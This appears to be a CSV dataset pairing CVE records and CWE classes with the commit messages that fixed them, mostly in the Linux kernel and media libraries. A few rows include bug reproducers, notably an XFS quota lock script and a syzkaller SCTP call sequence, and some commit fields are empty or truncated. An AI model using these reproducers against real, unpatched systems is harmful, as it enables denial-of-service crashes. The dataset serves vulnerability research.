CVE-2018-8043,CWE-476,2018-03-10,"The unimac_mdio_probe function in drivers/net/phy/mdio-bcm-unimac.c in the Linux kernel through 4.15.8 does not validate certain resource availability, which allows local users to cause a denial of service (NULL pointer dereference).","platform_get_resource() may fail and return NULL, so we should better check it's return value to avoid a NULL pointer dereference a bit later in the code.  This is detected by Coccinelle semantic patch.  @@ expression pdev, res, n, t, e, e1, e2; @@  res = platform_get_resource(pdev, t, n); + if (!res) +   return -EINVAL; ... when != res == NULL e = devm_ioremap(e1, res->start, e2);  Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-6347,CWE-125,2017-03-01,"The ip_cmsg_recv_checksum function in net/ipv4/ip_sockglue.c in the Linux kernel before 4.10.1 has incorrect expectations about skb data layout, which allows local users to cause a denial of service (buffer over-read) or possibly have unspecified other impact via crafted system calls, as demonstrated by use of the MSG_MORE flag in conjunction with loopback UDP transmission.","The skbs processed by ip_cmsg_recv() are not guaranteed to be linear e.g. when sending UDP packets over loopback with MSGMORE. Using csum_partial() on [potentially] the whole skb len is dangerous; instead be on the safe side and use skb_checksum().  Thanks to syzkaller team to detect the issue and provide the reproducer.  v1 -> v2:  - move the variable declaration in a tighter scope  Fixes: ad6f939 (""ip: Add offset parameter to ip_cmsg_recv"") Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Paolo Abeni <pabeni@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-7863,CWE-787,2017-04-14,FFmpeg before 2017-02-04 has an out-of-bounds write caused by a heap-based buffer overflow related to the decode_frame_common function in libavcodec/pngdec.c.,Fixes out of array access Fixes: 546/clusterfuzz-testcase-4809433909559296  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-1465,CWE-17,2015-04-05,"The IPv4 implementation in the Linux kernel before 3.18.8 does not properly consider the length of the Read-Copy Update (RCU) grace period for redirecting lookups in the absence of caching, which allows remote attackers to cause a denial of service (memory consumption or system crash) via a flood of packets.","Not caching dst_entries which cause redirects could be exploited by hosts on the same subnet, causing a severe DoS attack. This effect aggravated since commit f886497 (""ipv4: fix dst race in sk_dst_get()"").  Lookups causing redirects will be allocated with DST_NOCACHE set which will force dst_release to free them via RCU.  Unfortunately waiting for RCU grace period just takes too long, we can end up with >1M dst_entries waiting to be released and the system will run OOM. rcuos threads cannot catch up under high softirq load.  Attaching the flag to emit a redirect later on to the specific skb allows us to cache those dst_entries thus reducing the pressure on allocation and deallocation.  This issue was discovered by Marcelo Leitner.  Cc: Julian Anastasov <ja@ssi.bg> Signed-off-by: Marcelo Leitner <mleitner@redhat.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-9652,CWE-119,2015-03-30,"The mconvert function in softmagic.c in file before 5.21, as used in the Fileinfo component in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5, does not properly handle a certain string-length field during a copy of a truncated version of a Pascal string, which might allow remote attackers to cause a denial of service (out-of-bounds memory access and application crash) via a crafted file.",or 4 bytes).
CVE-2014-8275,CWE-310,2015-01-09,"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k does not enforce certain constraints on certificate data, which allows remote attackers to defeat a fingerprint-based certificate-blacklist protection mechanism by including crafted data within a certificate's unsigned portion, related to crypto/asn1/a_verify.c, crypto/dsa/dsa_asn1.c, crypto/ecdsa/ecs_vrf.c, and crypto/x509/x_all.c.",By using non-DER or invalid encodings outside the signed portion of a certificate the fingerprint can be changed without breaking the signature. Although no details of the signed portion of the certificate can be changed this can cause problems with some applications: e.g. those using the certificate fingerprint for blacklists.  1. Reject signatures with non zero unused bits.  If the BIT STRING containing the signature has non zero unused bits reject the signature. All current signature algorithms require zero unused bits.  2. Check certificate algorithm consistency.  Check the AlgorithmIdentifier inside TBS matches the one in the certificate signature. NB: this will result in signature failure errors for some broken certificates.  3. Check DSA/ECDSA signatures use DER.  Reencode DSA/ECDSA signatures and compare with the original received signature. Return an error if there is a mismatch.  This will reject various cases including garbage after signature (thanks to Antti Karjalainen and Tuomo Untinen from the Codenomicon CROSS program for discovering this case) and use of BER or invalid ASN.1 INTEGERs (negative or with leading zeroes).  CVE-2014-8275 Reviewed-by: Emilia Käsper <emilia@openssl.org>
CVE-2017-9465,CWE-125,2017-06-06,The yr_arena_write_data function in YARA 3.6.1 allows remote attackers to cause a denial of service (buffer over-read and application crash) or obtain sensitive information from process memory via a crafted file that is mishandled in the yr_re_fast_exec function in libyara/re.c and the _yr_scan_match_callback function in libyara/scan.c.,
CVE-2018-12247,CWE-476,2018-06-12,"An issue was discovered in mruby 1.4.1. There is a NULL pointer dereference in mrb_class, related to certain .clone usage, because mrb_obj_clone in kernel.c copies flags other than the MRB_FLAG_IS_FROZEN flag (e.g., the embedded flag).",Copying all flags from the original object may overwrite the clone's flags e.g. the embedded flag.
CVE-2016-2186,,2016-05-02,The powermate_probe function in drivers/input/misc/powermate.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,"The powermate driver expects at least one valid USB endpoint in its probe function.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash.  Validate the number of endpoints on the interface before using them.  The full report for this issue can be found here: http://seclists.org/bugtraq/2016/Mar/85  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2017-9993,CWE-200,2017-06-28,"FFmpeg before 2.8.12, 3.0.x and 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.",This prevents part of one exploit leading to an information leak  Found-by: Emil Lerner and Pavel Cheremushkin Reported-by: Thierry Foucu <tfoucu@google.com>  Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-11591,CWE-476,2018-05-31,Espruino before 1.98 allows attackers to cause a denial of service (application crash) with a user crafted input file via a NULL pointer dereference during syntax parsing. This was addressed by adding validation for a debug trace print statement in jsvar.c.,
CVE-2016-9777,CWE-125,2016-12-28,"KVM in the Linux kernel before 4.8.12, when I/O APIC is enabled, does not properly restrict the VCPU index, which allows guest OS users to gain host OS privileges or cause a denial of service (out-of-bounds array access and host OS crash) via a crafted interrupt request, related to arch/x86/kvm/ioapic.c and arch/x86/kvm/ioapic.h.","KVM was using arrays of size KVM_MAX_VCPUS with vcpu_id, but ID can be bigger that the maximal number of VCPUs, resulting in out-of-bounds access.  Found by syzkaller:    BUG: KASAN: slab-out-of-bounds in __apic_accept_irq+0xb33/0xb50 at addr [...]   Write of size 1 by task a.out/27101   CPU: 1 PID: 27101 Comm: a.out Not tainted 4.9.0-rc5+ #49   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011    [...]   Call Trace:    [...] __apic_accept_irq+0xb33/0xb50 arch/x86/kvm/lapic.c:905    [...] kvm_apic_set_irq+0x10e/0x180 arch/x86/kvm/lapic.c:495    [...] kvm_irq_delivery_to_apic+0x732/0xc10 arch/x86/kvm/irq_comm.c:86    [...] ioapic_service+0x41d/0x760 arch/x86/kvm/ioapic.c:360    [...] ioapic_set_irq+0x275/0x6c0 arch/x86/kvm/ioapic.c:222    [...] kvm_ioapic_inject_all arch/x86/kvm/ioapic.c:235    [...] kvm_set_ioapic+0x223/0x310 arch/x86/kvm/ioapic.c:670    [...] kvm_vm_ioctl_set_irqchip arch/x86/kvm/x86.c:3668    [...] kvm_arch_vm_ioctl+0x1a08/0x23c0 arch/x86/kvm/x86.c:3999    [...] kvm_vm_ioctl+0x1fa/0x1a70 arch/x86/kvm/../../../virt/kvm/kvm_main.c:3099  Reported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: af1bae5 (""KVM: x86: bump KVM_MAX_VCPU_ID to 1023"") Reviewed-by: Paolo Bonzini <pbonzini@redhat.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>"
CVE-2019-15161,CWE-131,2019-10-03,rpcapd/daemon.c in libpcap before 1.9.1 mishandles certain length values because of reuse of a variable. This may open up an attack vector involving extra data at the end of a request.,"Using the same variable for the remaining request length and the reply length is confusing at best and can cause errors at worst (if the request had extra stuff at the end, so that the variable is non-zero).  This addresses Include Security issue I8: [libpcap] Remote Packet Capture Daemon Parameter Reuse."
CVE-2011-2906,CWE-400,2012-05-24,Integer signedness error in the pmcraid_ioctl_passthrough function in drivers/scsi/pmcraid.c in the Linux kernel before 3.1 might allow local users to cause a denial of service (memory consumption or memory corruption) via a negative size value in an ioctl call. NOTE: this may be a vulnerability only in unusual environments that provide a privileged program for obtaining the required file descriptor.,"There's a code path in pmcraid that can be reached via device ioctl that causes all sorts of ugliness, including heap corruption or triggering the OOM killer due to consecutive allocation of large numbers of pages.  First, the user can call pmcraid_chr_ioctl(), with a type PMCRAID_PASSTHROUGH_IOCTL.  This calls through to pmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer is copied in, and the request_size variable is set to buffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit signed value provided by the user.  If a negative value is provided here, bad things can happen.  For example, pmcraid_build_passthrough_ioadls() is called with this request_size, which immediately calls pmcraid_alloc_sglist() with a negative size. The resulting math on allocating a scatter list can result in an overflow in the kzalloc() call (if num_elem is 0, the sglist will be smaller than expected), or if num_elem is unexpectedly large the subsequent loop will call alloc_pages() repeatedly, a high number of pages will be allocated and the OOM killer might be invoked.  It looks like preventing this value from being negative in pmcraid_ioctl_passthrough() would be sufficient.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Bottomley <JBottomley@Parallels.com>"
CVE-2017-13145,CWE-20,2017-08-23,"In ImageMagick before 6.9.8-8 and 7.x before 7.0.5-9, the ReadJP2Image function in coders/jp2.c does not properly validate the channel geometry, leading to a crash.",
CVE-2012-1571,CWE-119,2012-07-17,file before 5.11 and libmagic allow remote attackers to cause a denial of service (crash) via a crafted Composite Document File (CDF) file that triggers (1) an out-of-bounds read or (2) an invalid pointer dereference.,
CVE-2017-18120,CWE-415,2018-02-02,"A double-free bug in the read_gif function in gifread.c in gifsicle 1.90 allows a remote attacker to cause a denial-of-service attack or unspecified other impact via a maliciously crafted file, because last_name is mishandled, a different vulnerability than CVE-2017-1000421.","With a non-malicious GIF, last_name is set to NULL when a name extension is followed by an image. Reported in #117, via Debian, via a KAIST fuzzing program."
CVE-2015-8894,CWE-415,2017-03-15,Double free vulnerability in coders/tga.c in ImageMagick 7.0.0 and later allows remote attackers to cause a denial of service (application crash) via a crafted tga file.,
CVE-2014-9728,CWE-119,2015-08-31,"The UDF filesystem implementation in the Linux kernel before 3.18.2 does not validate certain lengths, which allows local users to cause a denial of service (buffer over-read and system crash) via a crafted filesystem image, related to fs/udf/inode.c and fs/udf/symlink.c.",Verify that inode size is sane when loading inode with data stored in ICB. Otherwise we may get confused later when working with the inode and inode size is too big.  CC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2017-6319,CWE-119,2017-03-02,The dex_parse_debug_item function in libr/bin/p/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted DEX file.,
CVE-2016-7536,CWE-20,2017-04-20,magick/profile.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via a crafted profile.,
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2017-9949,CWE-787,2017-06-26,"The grub_memmove function in shlr/grub/kern/misc.c in radare2 1.5.0 allows remote attackers to cause a denial of service (stack-based buffer underflow and application crash) or possibly have unspecified other impact via a crafted binary file, possibly related to a buffer underflow in fs/ext2.c in GNU GRUB 2.02.",
CVE-2016-10249,CWE-190,2017-03-15,"Integer overflow in the jpc_dec_tiledecode function in jpc_dec.c in JasPer before 1.900.12 allows remote attackers to have unspecified impact via a crafted image file, which triggers a heap-based buffer overflow.",
CVE-2016-10048,CWE-22,2017-03-23,Directory traversal vulnerability in magick/module.c in ImageMagick 6.9.4-7 allows remote attackers to load arbitrary modules via unspecified vectors.,
CVE-2016-2546,CWE-362,2016-04-27,"sound/core/timer.c in the Linux kernel before 4.4.1 uses an incorrect type of mutex, which allows local users to cause a denial of service (race condition, use-after-free, and system crash) via a crafted ioctl call.","ALSA timer ioctls have an open race and this may lead to a use-after-free of timer instance object.  A simplistic fix is to make each ioctl exclusive.  We have already tread_sem for controlling the tread, and extend this as a global mutex to be applied to each ioctl.  The downside is, of course, the worse concurrency.  But these ioctls aren't to be parallel accessible, in anyway, so it should be fine to serialize there.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-12981,CWE-20,2019-06-26,"Ming (aka libming) 0.4.8 has an ""fill overflow"" vulnerability in the function SWFShape_setLeftFillStyle in blocks/shape.c.",
CVE-2018-1066,CWE-476,2018-03-02,"The Linux kernel before version 4.11 is vulnerable to a NULL pointer dereference in fs/cifs/cifsencrypt.c:setup_ntlmv2_rsp() that allows an attacker controlling a CIFS server to kernel panic a client that has this server mounted, because an empty TargetInfo field in an NTLMSSP setup negotiation response is mishandled during session recovery.",
CVE-2015-1867,CWE-264,2015-08-12,"Pacemaker before 1.1.13 does not properly evaluate added nodes, which allows remote read-only users to gain privileges via an acl command.",It is not appropriate when the node has no children as it is not a placeholder
CVE-2015-3185,CWE-264,2015-07-20,"The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",Replacement of ap_some_auth_required (unusable in Apache httpd 2.4) with new ap_some_authn_required and ap_force_authn hook.  Submitted by: breser   git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1684524 13f79535-47bb-0310-9956-ffa450edef68
CVE-2019-15538,CWE-400,2019-08-25,"An issue was discovered in xfs_setattr_nonsize in fs/xfs/xfs_iops.c in the Linux kernel through 5.2.9. XFS partially wedges when a chgrp fails on account of being out of disk quota. xfs_setattr_nonsize is failing to unlock the ILOCK after the xfs_qm_vop_chown_reserve call fails. This is primarily a local DoS attack vector, but it might result as well in remote DoS if the XFS filesystem is exported for instance via NFS.","Benjamin Moody reported to Debian that XFS partially wedges when a chgrp fails on account of being out of disk quota.  I ran his reproducer script:  # adduser dummy # adduser dummy plugdev  # dd if=/dev/zero bs=1M count=100 of=test.img # mkfs.xfs test.img # mount -t xfs -o gquota test.img /mnt # mkdir -p /mnt/dummy # chown -c dummy /mnt/dummy # xfs_quota -xc 'limit -g bsoft=100k bhard=100k plugdev' /mnt  (and then as user dummy)  $ dd if=/dev/urandom bs=1M count=50 of=/mnt/dummy/foo $ chgrp plugdev /mnt/dummy/foo  and saw:  ================================================ WARNING: lock held when returning to user space! 5.3.0-rc5 #rc5 Tainted: G        W ------------------------------------------------ chgrp/47006 is leaving the kernel with locks still held! 1 lock held by chgrp/47006:  #0: 000000006664ea2d (&xfs_nondir_ilock_class){++++}, at: xfs_ilock+0xd2/0x290 [xfs]  ...which is clearly caused by xfs_setattr_nonsize failing to unlock the ILOCK after the xfs_qm_vop_chown_reserve call fails.  Add the missing unlock.  Reported-by: benjamin.moody@gmail.com Fixes: 253f491 (""xfs: better xfs_trans_alloc interface"") Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com> Reviewed-by: Dave Chinner <dchinner@redhat.com> Tested-by: Salvatore Bonaccorso <carnil@debian.org>"
CVE-2017-12990,CWE-835,2017-09-14,"The ISAKMP parser in tcpdump before 4.9.2 could enter an infinite loop due to bugs in print-isakmp.c, several functions.","The closest thing to a specification for the contents of the payload data is draft-ietf-ipsec-notifymsg-04, and nothing in there says that it is ever a complete ISAKMP message, so don't dissect types we don't have specific code for as a complete ISAKMP message.  While we're at it, fix a comment, and clean up printing of V1 Nonce, V2 Authentication payloads, and v2 Notice payloads.  This fixes an infinite loop discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-12154,,2017-09-26,"The prepare_vmcs02 function in arch/x86/kvm/vmx.c in the Linux kernel through 4.13.3 does not ensure that the ""CR8-load exiting"" and ""CR8-store exiting"" L0 vmcs02 controls exist in cases where L1 omits the ""use TPR shadow"" vmcs12 control, which allows KVM L2 guest OS users to obtain read and write access to the hardware CR8 register.","If L1 does not specify the ""use TPR shadow"" VM-execution control in vmcs12, then L0 must specify the ""CR8-load exiting"" and ""CR8-store exiting"" VM-execution controls in vmcs02. Failure to do so will give the L2 VM unrestricted read/write access to the hardware CR8.  This fixes CVE-2017-12154.  Signed-off-by: Jim Mattson <jmattson@google.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2015-0285,CWE-310,2015-03-19,"The ssl3_client_hello function in s3_clnt.c in OpenSSL 1.0.2 before 1.0.2a does not ensure that the PRNG is seeded before proceeding with a handshake, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by sniffing the network and then conducting a brute-force attack.",
CVE-2012-0807,CWE-119,2012-01-27,"Stack-based buffer overflow in the suhosin_encrypt_single_cookie function in the transparent cookie-encryption feature in the Suhosin extension before 0.9.33 for PHP, when suhosin.cookie.encrypt and suhosin.multiheader are enabled, might allow remote attackers to execute arbitrary code via a long string that is used in a Set-Cookie HTTP header.",
CVE-2018-13093,CWE-476,2018-07-03,An issue was discovered in fs/xfs/xfs_icache.c in the Linux kernel through 4.17.3. There is a NULL pointer dereference and panic in lookup_slow() on a NULL inode->i_ops pointer when doing pathwalks on a corrupted xfs image. This occurs because of a lack of proper validation that cached inodes are free during allocation.,"A recent fuzzed filesystem image cached random dcache corruption when the reproducer was run. This often showed up as panics in lookup_slow() on a null inode->i_ops pointer when doing pathwalks.  BUG: unable to handle kernel NULL pointer dereference at 0000000000000000 .... Call Trace:  lookup_slow+0x44/0x60  walk_component+0x3dd/0x9f0  link_path_walk+0x4a7/0x830  path_lookupat+0xc1/0x470  filename_lookup+0x129/0x270  user_path_at_empty+0x36/0x40  path_listxattr+0x98/0x110  SyS_listxattr+0x13/0x20  do_syscall_64+0xf5/0x280  entry_SYSCALL_64_after_hwframe+0x42/0xb7  but had many different failure modes including deadlocks trying to lock the inode that was just allocated or KASAN reports of use-after-free violations.  The cause of the problem was a corrupt INOBT on a v4 fs where the root inode was marked as free in the inobt record. Hence when we allocated an inode, it chose the root inode to allocate, found it in the cache and re-initialised it.  We recently fixed a similar inode allocation issue caused by inobt record corruption problem in xfs_iget_cache_miss() in commit ee45700 (""xfs: catch inode allocation state mismatch corruption""). This change adds similar checks to the cache-hit path to catch it, and turns the reproducer into a corruption shutdown situation.  Reported-by: Wen Xu <wen.xu@gatech.edu> Signed-Off-By: Dave Chinner <dchinner@redhat.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Carlos Maiolino <cmaiolino@redhat.com> Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com> [darrick: fix typos in comment] Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>"
CVE-2016-2347,CWE-190,2017-04-21,Integer underflow in the decode_level3_header function in lib/lha_file_header.c in Lhasa before 0.3.1 allows remote attackers to execute arbitrary code via a crafted archive.,"Marcin 'Icewall' Noga of Cisco TALOS discovered that the level 3 header decoding routines were vulnerable to an integer underflow, if the 32-bit header length was less than the base level 3 header length. This could lead to an exploitable heap corruption condition.  Thanks go to Marcin Noga and Regina Wilson of Cisco TALOS for reporting this vulnerability."
CVE-2018-1000037,CWE-20,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple reachable assertions in the PDF parser allow an attacker to cause a denial of service (assert crash) via a crafted file.",
CVE-2016-8636,CWE-190,2017-02-22,"Integer overflow in the mem_check_range function in drivers/infiniband/sw/rxe/rxe_mr.c in the Linux kernel before 4.9.10 allows local users to cause a denial of service (memory corruption), obtain sensitive information from kernel memory, or possibly have unspecified other impact via a write or read request involving the ""RDMA protocol over infiniband"" (aka Soft RoCE) technology.",
CVE-2017-15277,CWE-200,2017-10-12,"ReadGIFImage in coders/gif.c in ImageMagick 7.0.6-1 and GraphicsMagick 1.3.26 leaves the palette uninitialized when processing a GIF file that has neither a global nor local palette. If the affected product is used as a library loaded into a process that operates on interesting data, this data sometimes can be leaked via the uninitialized palette.",
CVE-2018-10888,CWE-20,2018-07-10,"A flaw was found in libgit2 before version 0.27.3. A missing check in git_delta_apply function in delta.c file, may lead to an out-of-bound read while reading a binary delta file. An attacker may use this flaw to cause a Denial of Service.","When computing the offset and length of the delta base, we repeatedly increment the `delta` pointer without checking whether we have advanced past its end already, which can thus result in an out-of-bounds read. Fix this by repeatedly checking whether we have reached the end. Add a test which would cause Valgrind to produce an error.  Reported-by: Riccardo Schirone <rschiron@redhat.com> Test-provided-by: Riccardo Schirone <rschiron@redhat.com>"
CVE-2013-4350,CWE-310,2013-09-25,"The IPv6 SCTP implementation in net/sctp/ipv6.c in the Linux kernel through 3.11.1 uses data structures and function calls that do not trigger an intended configuration of IPsec encryption, which allows remote attackers to obtain sensitive information by sniffing the network.","Alan Chester reported an issue with IPv6 on SCTP that IPsec traffic is not being encrypted, whereas on IPv4 it is. Setting up an AH + ESP transport does not seem to have the desired effect:  SCTP + IPv4:    22:14:20.809645 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 116)     192.168.0.2 > 192.168.0.5: AH(spi=0x00000042,sumlen=16,seq=0x1): ESP(spi=0x00000044,seq=0x1), length 72   22:14:20.813270 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 340)     192.168.0.5 > 192.168.0.2: AH(spi=0x00000043,sumlen=16,seq=0x1):  SCTP + IPv6:    22:31:19.215029 IP6 (class 0x02, hlim 64, next-header SCTP (132) payload length: 364)     fe80::222:15ff:fe87:7fc.3333 > fe80::92e6:baff:fe0d:5a54.36767: sctp     1) [INIT ACK] [init tag: 747759530] [rwnd: 62464] [OS: 10] [MIS: 10]  Moreover, Alan says:    This problem was seen with both Racoon and Racoon2. Other people have seen   this with OpenSwan. When IPsec is configured to encrypt all upper layer   protocols the SCTP connection does not initialize. After using Wireshark to   follow packets, this is because the SCTP packet leaves Box A unencrypted and   Box B believes all upper layer protocols are to be encrypted so it drops   this packet, causing the SCTP connection to fail to initialize. When IPsec   is configured to encrypt just SCTP, the SCTP packets are observed unencrypted.  In fact, using `socat sctp6-listen:3333 -` on one end and transferring ""plaintext"" string on the other end, results in cleartext on the wire where SCTP eventually does not report any errors, thus in the latter case that Alan reports, the non-paranoid user might think he's communicating over an encrypted transport on SCTP although he's not (tcpdump ... -X):    ...   0x0030: 5d70 8e1a 0003 001a 177d eb6c 0000 0000  ]p.......}.l....   0x0040: 0000 0000 706c 6169 6e74 6578 740a 0000  ....plaintext...  Only in /proc/net/xfrm_stat we can see XfrmInTmplMismatch increasing on the receiver side. Initial follow-up analysis from Alan's bug report was done by Alexey Dobriyan. Also thanks to Vlad Yasevich for feedback on this.  SCTP has its own implementation of sctp_v6_xmit() not calling inet6_csk_xmit(). This has the implication that it probably never really got updated along with changes in inet6_csk_xmit() and therefore does not seem to invoke xfrm handlers.  SCTP's IPv4 xmit however, properly calls ip_queue_xmit() to do the work. Since a call to inet6_csk_xmit() would solve this problem, but result in unecessary route lookups, let us just use the cached flowi6 instead that we got through sctp_v6_get_dst(). Since all SCTP packets are being sent through sctp_packet_transmit(), we do the route lookup / flow caching in sctp_transport_route(), hold it in tp->dst and skb_dst_set() right after that. If we would alter fl6->daddr in sctp_v6_xmit() to np->opt->srcrt, we possibly could run into the same effect of not having xfrm layer pick it up, hence, use fl6_update_dst() in sctp_v6_get_dst() instead to get the correct source routed dst entry, which we assign to the skb.  Also source address routing example from 6250341 (""sctp: fix sctp to work with ipv6 source address routing"") still works with this patch! Nevertheless, in RFC5095 it is actually 'recommended' to not use that anyway due to traffic amplification [1]. So it seems we're not supposed to do that anyway in sctp_v6_xmit(). Moreover, if we overwrite the flow destination here, the lower IPv6 layer will be unable to put the correct destination address into IP header, as routing header is added in ipv6_push_nfrag_opts() but then probably with wrong final destination. Things aside, result of this patch is that we do not have any XfrmInTmplMismatch increase plus on the wire with this patch it now looks like:  SCTP + IPv6:    08:17:47.074080 IP6 2620:52:0:102f:7a2b:cbff:fe27:1b0a > 2620:52:0:102f:213:72ff:fe32:7eba:     AH(spi=0x00005fb4,seq=0x1): ESP(spi=0x00005fb5,seq=0x1), length 72   08:17:47.074264 IP6 2620:52:0:102f:213:72ff:fe32:7eba > 2620:52:0:102f:7a2b:cbff:fe27:1b0a:     AH(spi=0x00003d54,seq=0x1): ESP(spi=0x00003d55,seq=0x1), length 296  This fixes Kernel Bugzilla 24412. This security issue seems to be present since 2.6.18 kernels. Lets just hope some big passive adversary in the wild didn't have its fun with that. lksctp-tools IPv6 regression test suite passes as well with this patch.   [1] http://www.secdev.org/conf/IPv6_RH_security-csw07.pdf  Reported-by: Alan Chester <alan.chester@tekelec.com> Reported-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10066,CWE-120,2017-03-03,Buffer overflow in the ReadVIFFImage function in coders/viff.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via a crafted file.,
CVE-2017-15115,CWE-416,2017-11-15,"The sctp_do_peeloff function in net/sctp/socket.c in the Linux kernel before 4.14 does not check whether the intended netns is used in a peel-off action, which allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via crafted system calls.","Now when peeling off an association to the sock in another netns, all transports in this assoc are not to be rehashed and keep use the old key in hashtable.  As a transport uses sk->net as the hash key to insert into hashtable, it would miss removing these transports from hashtable due to the new netns when closing the sock and all transports are being freeed, then later an use-after-free issue could be caused when looking up an asoc and dereferencing those transports.  This is a very old issue since very beginning, ChunYu found it with syzkaller fuzz testing with this series:    socket$inet6_sctp()   bind$inet6()   sendto$inet6()   unshare(0x40000000)   getsockopt$inet_sctp6_SCTP_GET_ASSOC_ID_LIST()   getsockopt$inet_sctp6_SCTP_SOCKOPT_PEELOFF()  This patch is to block this call when peeling one assoc off from one netns to another one, so that the netns of all transport would not go out-sync with the key in hashtable.  Note that this patch didn't fix it by rehashing transports, as it's difficult to handle the situation when the tuple is already in use in the new netns. Besides, no one would like to peel off one assoc to another netns, considering ipaddrs, ifaces, etc. are usually different.  Reported-by: ChunYu Wang <chunwang@redhat.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Acked-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
